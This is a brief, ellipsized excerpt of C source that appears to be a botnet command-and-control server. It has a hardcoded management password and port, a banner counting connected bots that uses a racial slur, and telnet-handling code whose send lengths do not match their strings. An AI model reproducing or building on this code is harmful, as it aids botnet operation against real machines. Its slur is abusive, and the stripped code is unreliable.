...
#define MY_MGM_PASS "MyName900"
#define MY_MGM_PORT 3421
...
void *titleWriter(void *sock) // just an informational banner
{
        ...
        while(1)
        {
                ...
                sprintf(string, "%c]0;Boats Online: %d | Niggas Online: %d%c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *sock)
{
	...
	if(send(thefd, "\r\n", 49, MSG_NOSIGNAL) == -1) goto end;
        ...
        if(send(thefd, "\r\n", 63, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\r\n\r\n> \x1b[0m", 45, MSG_NOSIGNAL) == -1) goto end;
